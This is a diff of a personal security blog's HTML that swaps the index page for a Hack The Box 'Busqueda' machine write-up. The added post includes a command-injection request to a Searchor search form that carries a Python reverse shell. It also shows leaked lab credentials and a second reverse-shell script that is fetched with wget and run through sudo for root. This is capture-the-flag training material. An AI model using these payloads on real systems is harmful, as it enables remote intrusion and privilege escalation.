@@ -44,41 +44,43 @@
 
 
   
+
+
+
+
+
   
-
-
-
-
+  
+  
 
 
 <!-- Open Graph image and Twitter Card metadata -->
 
-<title itemprop="name">sysevil</title>
-<meta property="og:title" content=sysevil />
-<meta name="twitter:title" content=sysevil />
-<meta itemprop="name" content=sysevil />
-<meta name="application-name" content=sysevil />
+<title itemprop="name">sysevil - Busqueda</title>
+<meta property="og:title" content=sysevil&#32;-&#32;Busqueda />
+<meta name="twitter:title" content=sysevil&#32;-&#32;Busqueda />
+<meta itemprop="name" content=sysevil&#32;-&#32;Busqueda />
+<meta name="application-name" content=sysevil&#32;-&#32;Busqueda />
 <meta property="og:site_name" content="" />
 
 
-<meta name="description" content="I am a (security|dev) researcher focus on 👁️🪲" />
-<meta itemprop="description" content="I am a (security|dev) researcher focus on 👁️🪲" />
-<meta property="og:description" content="I am a (security|dev) researcher focus on 👁️🪲" />
-<meta name="twitter:description" content="I am a (security|dev) researcher focus on 👁️🪲" />
+<meta name="description" content="" />
+<meta itemprop="description" content="" />
+<meta property="og:description" content="" />
+<meta name="twitter:description" content="" />
 
 
-<base href="https://sysevil.github.io/" />
-<link rel="canonical" href="https://sysevil.github.io/" itemprop="url" />
-<meta name="url" content="https://sysevil.github.io/" />
-<meta name="twitter:url" content="https://sysevil.github.io/" />
-<meta property="og:url" content="https://sysevil.github.io/" />
+<base href="https://sysevil.github.io/htb/busqueda/" />
+<link rel="canonical" href="https://sysevil.github.io/htb/busqueda/" itemprop="url" />
+<meta name="url" content="https://sysevil.github.io/htb/busqueda/" />
+<meta name="twitter:url" content="https://sysevil.github.io/htb/busqueda/" />
+<meta property="og:url" content="https://sysevil.github.io/htb/busqueda/" />
 
 
-<meta property="og:updated_time" content=14002-14-05T221:12:24-0300 />
+<meta property="og:updated_time" content=14002-14-05T219:08:24-0300 />
 
 
 <link rel="sitemap" type="application/xml" title="Sitemap" href='https://sysevil.github.io/sitemap.xml' />
-<link href="https://sysevil.github.io/index.xml" rel="alternate" type="application/rss+xml" title="" />
 
 <meta name="robots" content="index,follow" />
 <meta name="googlebot" content="index,follow" />
@@ -340,53 +342,8 @@ powered by <a target="_blank" href="https://gohugo.io">Hugo</a> | themed with <a
 </aside>
 
             <main class="content container">
-                <div class="posts">
-    
-    
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://sysevil.github.io/htb/devvortex/">Devvortex</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      <time datetime=" 2024-02-14T17:21:12-0300" class="post-date">
-        February 14, 2024
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        #joomla IP: 10.10.11.242 OS: Linux
-PortScanner nmap --min-rate 1000 -sV -sC -p- -oG fullscan 10.10.11.242 Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-06 09:41 -03 Nmap scan report for 10.10.11.242 (10.10.11.242) Host is up (0.21s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA) | 256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA) |_ 256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519) 80/tcp open http nginx 1.
-        
-        <div class="read-more-link">
-            <a href="/htb/devvortex/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
+                <div class="post">
+  <div class="info">
   <h1 class="post-title">
     <a href="https://sysevil.github.io/htb/busqueda/">Busqueda</a>
   </h1>
@@ -417,150 +374,156 @@ PortScanner nmap --min-rate 1000 -sV -sC -p- -oG fullscan 10.10.11.242 Starting 
   
 </div>
 
-        
-        #searcho Os: Linux | Easy ip: 10.10.11.208
-Web: - Werkzeug/2.1.2 Python/3.10.6 - Flask Python - Framework ? Searchor 2.4.0
-Exploits: - https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/main/exploit.sh ( searchor 2.4.0) - Exploit: https://github.com/jonnyzar/POC-Searchor-2.4.2
-Reverse shell with searcho-exploit Exploit payload request: POST /search HTTP/1.1 Host: searcher.htb User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate, br Content-Type: application/x-www-form-urlencoded Content-Length: 283 Origin: http://searcher.htb Connection: close Referer: http://searcher.htb/search Upgrade-Insecure-Requests: 1 engine=Amazon&amp;query=&#39;%20,%20exec(&#34;import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.14.11&#39;,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/sh&#39;,&#39;-i&#39;]);&#34;))#&amp;auto_redirect=10.10.14.11 Attacker machine Upgrade shell to TTY shell python3 -c &#39;import pty; pty.
-        
-        <div class="read-more-link">
-            <a href="/htb/busqueda/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://sysevil.github.io/htb/builder/">Builder</a>
-  </h1>
+  <hr>
+<p>#searcho
+Os: Linux | Easy
+ip: 10.10.11.208</p>
+<p>Web:
+- Werkzeug/2.1.2 Python/3.10.6
+- Flask Python
+- Framework ? Searchor 2.4.0</p>
+<p>Exploits:
+- <a href="https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/main/exploit.sh" target="_blank">https://raw.githubusercontent.com/nikn0laty/Exploit-for-Searchor-2.4.0-Arbitrary-CMD-Injection/main/exploit.sh</a> ( searchor 2.4.0)
+- Exploit: <a href="https://github.com/jonnyzar/POC-Searchor-2.4.2" target="_blank">https://github.com/jonnyzar/POC-Searchor-2.4.2</a></p>
+<h4 id="reverse-shell-with-searcho-exploit">Reverse shell with searcho-exploit</h4>
+<ol>
+<li>Exploit payload request:</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-http" data-lang="http"><span style="display:flex;"><span><span style="color:#a6e22e">POST</span> /search <span style="color:#66d9ef">HTTP</span><span style="color:#f92672">/</span><span style="color:#ae81ff">1.1</span>
+</span></span><span style="display:flex;"><span>Host<span style="color:#f92672">:</span> <span style="color:#ae81ff">searcher.htb</span>
+</span></span><span style="display:flex;"><span>User-Agent<span style="color:#f92672">:</span> <span style="color:#ae81ff">Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0</span>
+</span></span><span style="display:flex;"><span>Accept<span style="color:#f92672">:</span> <span style="color:#ae81ff">text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span>
+</span></span><span style="display:flex;"><span>Accept-Language<span style="color:#f92672">:</span> <span style="color:#ae81ff">en-US,en;q=0.5</span>
+</span></span><span style="display:flex;"><span>Accept-Encoding<span style="color:#f92672">:</span> <span style="color:#ae81ff">gzip, deflate, br</span>
+</span></span><span style="display:flex;"><span>Content-Type<span style="color:#f92672">:</span> <span style="color:#ae81ff">application/x-www-form-urlencoded</span>
+</span></span><span style="display:flex;"><span>Content-Length<span style="color:#f92672">:</span> <span style="color:#ae81ff">283</span>
+</span></span><span style="display:flex;"><span>Origin<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://searcher.htb</span>
+</span></span><span style="display:flex;"><span>Connection<span style="color:#f92672">:</span> <span style="color:#ae81ff">close</span>
+</span></span><span style="display:flex;"><span>Referer<span style="color:#f92672">:</span> <span style="color:#ae81ff">http://searcher.htb/search</span>
+</span></span><span style="display:flex;"><span>Upgrade-Insecure-Requests<span style="color:#f92672">:</span> <span style="color:#ae81ff">1</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>engine=Amazon&amp;query=&#39;%20,%20exec(&#34;import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#39;10.10.14.11&#39;,80));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([&#39;/bin/sh&#39;,&#39;-i&#39;]);&#34;))#&amp;auto_redirect=10.10.14.11
+</span></span></code></pre></div><ol start="2">
+<li>Attacker machine</li>
+</ol>
+<p><img src="/markdown-export-output-attachments/b6f676e7ed09183b2bf93a12e4940562.png" alt=""></p>
+<p><img src="/markdown-export-output-attachments/d67eb76e144a33705debff8c40b8a151.png" alt=""></p>
+<ol start="3">
+<li>Upgrade shell to TTY shell</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>python3 -c <span style="color:#e6db74">&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
+</span></span></code></pre></div><ol start="4">
+<li>Getting the <code>user.txt</code></li>
+</ol>
+<p><img src="/markdown-export-output-attachments/e2252401eb7bc9c48f9cdbed44b509d2.png" alt=""></p>
+<h4 id="priv-escal">Priv Escal</h4>
+<ol>
+<li>After getting shell execute <code>ls -lha</code> verify that you can get the credentials at <code>.config</code> at <code>.git</code> folder:</li>
+</ol>
+<p><img src="/markdown-export-output-attachments/85594ab27a6cdefe5f797c26eb29fad1.png" alt=""></p>
+<p><code>http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git</code></p>
+<ol start="2">
+<li>Verify sudo commands that the <code>svc</code> user can execute</li>
+</ol>
+<p><img src="/markdown-export-output-attachments/593a68168ebabfdffc24ccb9f266fe93.png" alt=""></p>
+<ol start="3">
+<li>Verify that the user can execute the files bot not <code>read</code> <code>write</code> &hellip;</li>
+</ol>
+<p><img src="/markdown-export-output-attachments/766d44cff12cc7e969344180afe2a673.png" alt=""></p>
+<p><img src="/markdown-export-output-attachments/f950e7cfbd93a0b72599a3039d111378.png" alt=""></p>
+<ol start="4">
+<li>Running the commands to get <code>.config</code> from <code>gitea</code></li>
+</ol>
+<p><img src="/markdown-export-output-attachments/aedea4d5c9c3a5ff5c48d6baea58f262.png" alt="">
+Database Password
+User:gitea
+Password:yuiu1hoiu4i5ho1uh</p>
+<blockquote>
+<p>We found two potencials users here administrator and gitea</p>
+</blockquote>
+<ol start="5">
+<li>
+<p>Bind SSH with Proxychains + FoxyProxyConfig</p>
+</li>
+<li>
+<p>FoxyProxy config</p>
+</li>
+</ol>
+<p><img src="/markdown-export-output-attachments/7a3e2d38a45e3c164f625d40a5e98ff4.png" alt=""></p>
+<ol start="2">
+<li><code>/etc/proxychains.conf</code></li>
+</ol>
+<p><img src="/markdown-export-output-attachments/757e6b74975089b3d69763738b2b5143.png" alt=""></p>
+<ol start="3">
+<li>Bind connection with the command <code>ssh -D</code></li>
+</ol>
+<p><img src="/markdown-export-output-attachments/6a154fb6cb20d9293ccf0b9cd2d79971.png" alt=""></p>
+<ol start="4">
+<li>Log in with the credentials</li>
+</ol>
+<p><img src="/markdown-export-output-attachments/a664f271fc8c7c635162edbe9b37af0f.png" alt=""></p>
+<ol start="5">
+<li>Log in with <code>administrator</code></li>
+</ol>
+<p><img src="/markdown-export-output-attachments/0a6897e784be1364fa55d80638b38f02.png" alt=""></p>
+<ol start="6">
+<li>Verify the <code>system-checkup.py</code> file notice that the <code>run_command</code> function run the <code>list of arguments</code></li>
+</ol>
+<p><img src="/markdown-export-output-attachments/1408f59355d5697828de9441d09e0290.png" alt="">
+<img src="/markdown-export-output-attachments/854495f01a2e7e3ea7172b19743ad41b.png" alt=""></p>
+<h4 id="exploit-the-script-behavior">Exploit the script behavior</h4>
+<ol>
+<li>Create a <code>sh</code> script with the the following content</li>
+</ol>
+<pre tabindex="0"><code>#!/usr/bin/python3  
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;10.10.14.11&#34;,9001));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(&#34;/bin/sh&#34;)
+</code></pre><ol start="2">
+<li>Save into your HTTP server at the attacker machine</li>
+<li>Inside the target machine, at <code>/tmp</code> dir, execute the following command to get the root shell</li>
+</ol>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>wget http://10.10.14.11:443/full-checkup.sh;chmod +x full-checkup.sh; sudo -S /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+</span></span></code></pre></div><p><img src="/markdown-export-output-attachments/0af684f9d7d78f32b1bb9bfe6de0f58d.png" alt=""></p>
+<h3 id="official-writeup">Official writeup</h3>
+<p><img src="/markdown-export-output-attachments/9e9fb06f14dea5f2983f1e4e805c4b39.pdf" alt=""></p>
 
-  <div class="headline">
-    <div>
-      
-      <time datetime=" 2024-02-14T17:16:46-0300" class="post-date">
-        February 14, 2024
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>5 mins read</span>
-      </span>
-    </div>
-
+  
+  <hr>
+<div class="footer">
     
-  </div>
-
-  
-  
-
-  
-</div>
-
+	    
+            <a class="previous-post" href="https://sysevil.github.io/htb/builder/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Builder</a>
         
-        IP: 10.10.11.10 OS: Linux Difficult: medium
-Port Scanner sudo nmap --min-rate 1000 -p- -T4 -sV 10.10.11.10 -oG full_scan [sudo] password for parallels: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-12 20:17 -03 Nmap scan report for 10.10.11.10 (10.10.11.10) Host is up (0.13s latency). Not shown: 65533 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0) 8080/tcp open http Jetty 10.
+	    
+            <div class="next-post">
+                <a href="https://sysevil.github.io/htb/devvortex/?ref=footer"><span style="font-weight:bold;">Next »</span><br>Devvortex</a>
+            </div>
         
-        <div class="read-more-link">
-            <a href="/htb/builder/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://sysevil.github.io/htb/bizness/">Bizness</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      <time datetime=" 2024-02-14T17:10:40-0300" class="post-date">
-        February 14, 2024
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>3 mins read</span>
-      </span>
-    </div>
-
     
-  </div>
-
-  
-  
+</div>
 
   
 </div>
-
-        
-        #obfiz IP: 10.10.11.252
-Port Scan sudo nmap --min-rate 1000 -p- -T4 -sV 10.10.11.252 -oG full_scan [sudo] password for parallels: Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-05 18:25 -03 Warning: 10.10.11.252 giving up on port because retransmission cap hit (6). Nmap scan report for 10.10.11.252 (10.10.11.252) Host is up (0.13s latency). Not shown: 65290 closed tcp ports (reset), 241 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.
-        
-        <div class="read-more-link">
-            <a href="/htb/bizness/">Read More…</a>
-        </div>
-        
-        
-    </article>
-    <article class="post">
-        <div class="info">
-  <h1 class="post-title">
-    <a href="https://sysevil.github.io/htb/steamcloud/">Steamcloud</a>
-  </h1>
-
-  <div class="headline">
-    <div>
-      
-      <time datetime=" 2024-02-14T16:59:48-0300" class="post-date">
-        February 14, 2024
-      </time>
-      
-      <span> - </span>
-      <span class="reading-time">
-        
-          
-        
-
-        <span>2 mins read</span>
-      </span>
-    </div>
-
-    
-  </div>
-
-  
-  
-
-  
-</div>
-
-        
-        Machine: Linux Difficult: Easy #Kubernetes #cloud IP: 10.10.14.149
-PortScanner Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-02-14 08:33 -03 Nmap scan report for 10.10.11.133 (10.10.11.133) Host is up (0.13s latency). Not shown: 65529 closed tcp ports (reset) PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0) 2379/tcp open ssl/etcd-client? 2380/tcp open ssl/etcd-server? 8443/tcp open ssl/https-alt 10249/tcp open http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) 10250/tcp open ssl/http Golang net/http server (Go-IPFS json-rpc or InfluxDB API) DirScanner _|.
-        
-        <div class="read-more-link">
-            <a href="/htb/steamcloud/">Read More…</a>
-        </div>
-        
-        
-    </article>
-</div>
-
-
-
             </main>
             
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li>
+      <ul>
+        <li></li>
+        <li><a href="#official-writeup">Official writeup</a></li>
+      </ul>
+    </li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
         </div>
     </body>
 </html>
